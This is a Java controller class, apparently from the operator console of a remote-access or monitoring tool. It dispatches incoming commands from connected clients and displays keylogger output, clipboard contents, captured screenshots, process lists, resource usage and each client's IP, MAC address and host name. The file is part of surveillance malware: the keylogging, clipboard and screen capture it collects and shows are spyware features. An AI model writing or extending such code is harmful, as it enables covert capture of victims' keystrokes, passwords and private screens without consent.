package controllers;

import admin.Admin;
import controllers.base.ConsumeExecutable;
import models.SystemInfoModel;
import org.json.JSONArray;
import org.json.JSONObject;
import swing.ProcessDialog;
import utils.JSON;
import utils.console;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;
import java.util.Vector;

import static utils.Command.*;
import static utils.Command.COMMAND_CLIENT_SCREEN;
import static utils.Environment.KEYLOGGER_SPLITTER;

public class ConsumeController {
    private static Map<String, ConsumeExecutable<JSON>> controller = new HashMap();

    public static void init() {
        put(COMMAND_SYNC, ConsumeController::synchronize);
        put(COMMAND_CLIPBOARD, ConsumeController::getClipboard);
        put(COMMAND_KEYLOGGER, ConsumeController::getKeylogger);
        put(COMMAND_CLIENT_SCREEN, ConsumeController::getScreen);
        put(COMMAND_MONITORING, ConsumeController::getMonitoring);
        put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
        put(COMMAND_PROCESS, ConsumeController::getProcess);
        put(COMMAND_NOTIFICATION, ConsumeController::notify);
    }

    private static void notify(JSON input, Admin admin) {
        Admin.getGui().showNotification(input.get("notification"));
    }

    private static void getProcess(JSON input, Admin admin) {
        JSONArray arr = new JSONArray(input.get("processes"));
        ProcessDialog dialog = new ProcessDialog(arr, admin);
        dialog.setVisible(true);
    }

    private static void getScreen(JSON input, Admin admin) {
        try {
            JSONArray imageBuffer = new JSONArray(input.get("image"));
            int length = input.getInt("length");
            byte[] arr = new byte[length];

            for (int i = 0; i < length; i++) {
                arr[i] = Byte.parseByte(imageBuffer.get(i).toString());
            }

            ByteArrayInputStream temp = new ByteArrayInputStream(ByteBuffer.wrap(arr).array());
            BufferedImage image2 = ImageIO.read(ImageIO.createImageInputStream(temp));
            ImageIcon temp1 = new ImageIcon(image2);
            Admin.getGui().fetchClientMonitor(temp1);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static void synchronize(JSON input, Admin admin) {
        Admin.getGui().sync();
        admin.setClients(new HashMap());
        ConsumeController.getAllClients(input, admin);
    }

    private static void getKeylogger(JSON input, Admin admin) {
        console.error(input.get("keylogger"));
        String[] logs = input.get("keylogger").split(KEYLOGGER_SPLITTER);
        for(String log : logs) {
            Admin.getGui().appendLog("[Keylog] " + log);
        }
    }

    private static void getClipboard(JSON input, Admin admin) {
        Admin.getGui().appendLog("[Clipboard] " + input.get("clipboard"));
    }

    private static void getAllClients(JSON input, Admin admin) {
        HashMap clients = admin.getClients();
        JSONArray arr = new JSONArray(input.get("clients"));
        arr.forEach(e -> {
            JSON json = new JSON(e.toString());
            clients.putIfAbsent(json.get("UUID"), new SystemInfoModel(
                    json.get("ram"),
                    json.get("cpu"),
                    json.get("disk"),
                    json.get("os"),
                    json.get("ip"),
                    json.get("MAC_address"),
                    json.get("hostName")
            ));
        });
    }

    private static void getMonitoring(JSON input, Admin admin) {
        try {
            Admin.getGui().fetchClientSystemUsage(
                    input.getInt("cpu"),
                    input.getInt("ram"),
                    input.getInt("disk"));
        } catch (Exception e) {
            // IN SOME CASE, CLIENT CAN NOT CALCULATE PERCENT CPU USAGE
            Admin.getGui().fetchClientSystemUsage(0, input.getInt("ram"), input.getInt("disk"));
        }
    }

    public static ConsumeExecutable get(String key) {
        return controller.getOrDefault(key, ConsumeController::getNotFoundController);
    }

    private static void getNotFoundController(JSON jsonObject, Admin admin) throws Exception {
        throw new Exception("Invalid Command");
    }

    public static ConsumeExecutable put(String key, ConsumeExecutable<JSON> value) {
        return controller.put(key, value);
    }
}
